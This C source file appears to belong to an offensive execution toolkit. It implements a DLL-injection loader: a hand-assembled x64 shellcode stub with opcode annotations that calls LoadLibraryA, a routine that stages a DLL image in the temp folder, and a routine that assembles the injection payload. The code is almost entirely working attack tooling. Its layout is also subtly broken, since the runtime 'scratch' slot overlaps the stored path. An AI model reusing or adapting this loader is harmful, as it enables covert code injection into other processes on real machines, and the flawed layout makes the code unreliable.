/*
 * rdll_loader.c — Reflective DLL Loader (Enhancement 5)
 * execution_engine/rdll_loader/rdll_loader.c
 *
 * Windows x64 | MinGW/Clang | Intel x86-64 ABI
 *
 * PIC stub — 96-byte hand-assembled x64.
 *
 * Annotated assembly → bytes:
 *
 *  call $+5                        E8 00 00 00 00
 *  pop  rdi                        5F
 *  sub  rdi, 5                     48 83 EF 05        → rdi = stub VA (remote_base)
 *  lea  rcx, [rdi + 0x68]          48 8D 4F 68        → dll_path arg
 *  mov  rax, [rdi + 0x60]          48 8B 47 60        → pLoadLibraryA
 *  sub  rsp, 0x20                  48 83 EC 20        → shadow space (shellcode entry RSP%16=0)
 *  call rax                        FF D0
 *  add  rsp, 0x20                  48 83 C4 20
 *  mov  [rdi + 0x70], rax          48 89 47 70        → save return handle for injector probe
 *  ret                             C3
 *  NOP sled to 96 bytes            0x90 × 63
 *
 * Encode verification (byte-counted from stub[0]):
 *  0x00   E8 00 00 00 00   call $+5      (5)
 *  0x05   5F               pop rdi       (1)
 *  0x06   48 83 EF 05      sub rdi,5     (4)
 *  0x0A   48 8D 4F 68      lea rcx       (4)
 *  0x0E   48 8B 47 60      mov rax       (4)
 *  0x12   48 83 EC 20      sub rsp,32    (4)
 *  0x16   FF D0            call rax      (2)
 *  0x18   48 83 C4 20      add rsp,32    (4)
 *  0x1C   48 89 47 70      mov scratch   (4)   ← new
 *  0x20   C3               ret           (1)
 *  0x21..0x5F NOP×63                    (63)
 *  ───────────────────────────────────── = 96 bytes ✓
 *
 * Param offsets from stub[0] (= remote_base):
 *  +0x60 = 96   pLoadLibraryA  (8 bytes)
 *  +0x68 = 104  dll_path       (NUL-terminated ASCII)
 *  +0x70 = 112  scratch        (8 bytes — LoadLibraryA retval written at runtime)
 */

#include "rdll_loader.h"
#include <stdio.h>
#include <string.h>

#define STUB_CODE_SIZE   96
#define PARAM_LOADLIB    0x60
#define PARAM_PATH       0x68
#define PARAM_SCRATCH    0x70   /* injector reads this after dwell to verify retval */

static const BYTE g_pic_stub[STUB_CODE_SIZE] = {
    /* 0x00 */ 0xE8, 0x00, 0x00, 0x00, 0x00,    /* call $+5            */
    /* 0x05 */ 0x5F,                              /* pop  rdi            */
    /* 0x06 */ 0x48, 0x83, 0xEF, 0x05,           /* sub  rdi, 5         */
    /* 0x0A */ 0x48, 0x8D, 0x4F, 0x68,           /* lea  rcx,[rdi+0x68] */
    /* 0x0E */ 0x48, 0x8B, 0x47, 0x60,           /* mov  rax,[rdi+0x60] */
    /* 0x12 */ 0x48, 0x83, 0xEC, 0x20,           /* sub  rsp, 0x20      */
    /* 0x16 */ 0xFF, 0xD0,                        /* call rax            */
    /* 0x18 */ 0x48, 0x83, 0xC4, 0x20,           /* add  rsp, 0x20      */
    /* 0x1C */ 0x48, 0x89, 0x47, 0x70,           /* mov  [rdi+0x70],rax */
    /* 0x20 */ 0xC3,                              /* ret                 */
    /* 0x21..0x5F — NOP sled 63 bytes */
    0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,
    0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,
    0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,
    0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,
    0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,
    0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,
    0x90,0x90,0x90
};

_Static_assert(sizeof(g_pic_stub) == STUB_CODE_SIZE, "stub size mismatch");
_Static_assert(PARAM_LOADLIB == 0x60,                "pLoadLibraryA offset wrong");
_Static_assert(PARAM_PATH    == 0x68,                "path offset wrong");
_Static_assert(PARAM_SCRATCH == 0x70,                "scratch offset wrong");

/* ── rdll_stage_to_temp ──────────────────────────────────────── */

BOOL rdll_stage_to_temp(LPBYTE dll_image, SIZE_T dll_size,
                        char *path_out, DWORD path_buf_len)
{
    /* *the dll smells of section headers and import tables nobody will see* */
    CHAR tmp_dir[MAX_PATH]  = {0};
    CHAR tmp_path[MAX_PATH] = {0};

    if (!GetTempPathA(MAX_PATH, tmp_dir)) {
        printf("[rdll] GetTempPathA failed error=%lu\n", GetLastError());
        return FALSE;
    }
    if (!GetTempFileNameA(tmp_dir, "jky", 0, tmp_path)) {
        printf("[rdll] GetTempFileNameA failed error=%lu\n", GetLastError());
        return FALSE;
    }

    HANDLE hFile = CreateFileA(tmp_path, GENERIC_WRITE, 0,
                               NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[rdll] CreateFileA(%s) failed error=%lu\n", tmp_path, GetLastError());
        return FALSE;
    }

    DWORD written = 0;
    BOOL  ok = WriteFile(hFile, dll_image, (DWORD)dll_size, &written, NULL)
               && written == (DWORD)dll_size;
    CloseHandle(hFile);

    if (!ok) {
        printf("[rdll] WriteFile failed error=%lu\n", GetLastError());
        DeleteFileA(tmp_path);
        return FALSE;
    }

    strncpy(path_out, tmp_path, path_buf_len - 1);
    path_out[path_buf_len - 1] = '\0';
    printf("[rdll] staged DLL → %s  (%zu bytes)\n", tmp_path, dll_size);
    return TRUE;
}

/* ── rdll_build_payload ──────────────────────────────────────── */

BOOL rdll_build_payload(const char *dll_path,
                        LPBYTE     *payload_out,
                        DWORD      *size_out)
{
    size_t path_len = strlen(dll_path) + 1;

    /* layout: [stub 96] [pLoadLibA 8] [path] */
    DWORD total = (DWORD)(STUB_CODE_SIZE + sizeof(ULONG_PTR) + path_len);

    BYTE *blob = (BYTE *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, total);
    if (!blob) {
        printf("[rdll] HeapAlloc(%lu) failed\n", total);
        return FALSE;
    }

    memcpy(blob, g_pic_stub, STUB_CODE_SIZE);

    HMODULE   hK32      = GetModuleHandleA("kernel32.dll");
    ULONG_PTR pLoadLibA = (ULONG_PTR)GetProcAddress(hK32, "LoadLibraryA");
    if (!pLoadLibA) {
        printf("[rdll] GetProcAddress(LoadLibraryA) failed error=%lu\n", GetLastError());
        HeapFree(GetProcessHeap(), 0, blob);
        return FALSE;
    }
    printf("[rdll] LoadLibraryA @ 0x%016llX\n", (unsigned long long)pLoadLibA);

    memcpy(blob + PARAM_LOADLIB, &pLoadLibA, sizeof(ULONG_PTR));
    memcpy(blob + PARAM_PATH,    dll_path,   path_len);

    printf("[rdll] payload: stub=%d + pLLA=8 + path=%zu = %lu bytes\n",
           STUB_CODE_SIZE, path_len, total);
    printf("[rdll] dll_path  @ stub+0x%02X = \"%s\"\n", PARAM_PATH, dll_path);
    printf("[rdll] scratch   @ stub+0x%02X (LoadLibraryA retval written here)\n",
           PARAM_SCRATCH);

    *payload_out = blob;
    *size_out    = total;
    return TRUE;
}